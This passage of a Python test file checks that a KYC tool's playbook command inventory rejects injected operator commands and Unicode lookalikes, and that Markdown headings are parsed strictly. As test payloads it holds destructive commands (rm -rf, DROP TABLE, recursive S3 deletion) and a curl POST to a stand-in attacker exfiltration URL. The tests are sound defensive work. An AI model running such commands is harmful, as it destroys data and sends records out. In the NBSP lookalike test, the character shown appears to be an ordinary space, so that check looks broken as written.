    """The audit's inventory escapes: rm/psql/aws/curl roots, the live sha256sum, NBSP and
    raw-newline lookalikes — all outside a python/alembic-rooted backtick scan. Operator
    commands now live ONLY in ```operator fences, parsed from exact bytes with any root; a
    destructive command added to a fence (even after a digest re-pin) fails the exact ordered
    comparison, and a lookalike with NBSP or a raw newline is not the reviewed line."""
    import shutil

    ref = _pr("Bundle-pinning activation").playbook_ref
    target = tmp_path / ref.path
    target.parent.mkdir(parents=True, exist_ok=True)
    shutil.copy(REPO / ref.path, target)
    text = target.read_text()
    heading_at = text.index(ref.heading)
    insert_at = text.index("\n## ", heading_at)
    for payload in ("rm -rf /var/lib/kyc", "psql -c 'DROP TABLE decisions'",
                    "aws s3 rm s3://kyc-evidence --recursive",
                    "curl -X POST https://attacker.invalid/exfil"):
        mutated = (text[:insert_at]
                   + f"\n```operator\n{payload}\n```\n" + text[insert_at:])
        target.write_text(mutated)
        section = _section_bytes(ref, root=tmp_path)
        repinned = dataclasses.replace(
            ref, sha256=hashlib.sha256(section.encode()).hexdigest())
        assert _command_inventory_problems(repinned, section), (
            f"{payload!r} joined the inventory without a typed record"
        )
    # NBSP and raw-newline lookalikes of a reviewed command are not the reviewed line
    real = "python -m kyc_tool.ops.verify_pinnable_backlog"
    for lookalike in (real.replace(" ", " ", 1),):
        mutated = text.replace(real, lookalike)
        assert mutated != text
        target.write_text(mutated)
        section = _section_bytes(ref, root=tmp_path)
        repinned = dataclasses.replace(
            ref, sha256=hashlib.sha256(section.encode()).hexdigest())
        assert _command_inventory_problems(repinned, section), (
            "an NBSP lookalike passed as the reviewed argv"
        )


def test_ru4_the_live_inventories_are_exact_and_exemption_free():
    """The marking convention replaces exemptions outright: an inline mention is a non-command
    by construction, so nothing can consume 'every identical occurrence' — the mechanism the
    audit defeated no longer exists."""
    for name in ("PR 5b full maintenance window", "Bundle-pinning activation",
                 "Migrations 013-023"):
        ref = _pr(name).playbook_ref
        assert not hasattr(ref, "exempt") or ref.exempt == (), (
            f"{name}: the exemption mechanism is still present"
        )
        section = _section_bytes(ref)
        assert _command_inventory_problems(ref, section) == []


def test_ru11_a_hash_prefixed_ordinary_line_is_not_a_heading():
    """`##NOT-A-HEADING` constructed and the reader treated it as level 2. CommonMark ATX needs
    whitespace after the hashes; both the record and the shared parser enforce it."""
    with pytest.raises(ValueError):
        playbook.PlaybookRef(path="docs/DEPLOYMENT.md", heading="##NOT-A-HEADING",
                             sha256="0" * 64)
    assert _atx_level("##NOT-A-HEADING") == 0
    assert _atx_level("## A real heading") == 2
    assert _atx_level("####### seven hashes") == 0
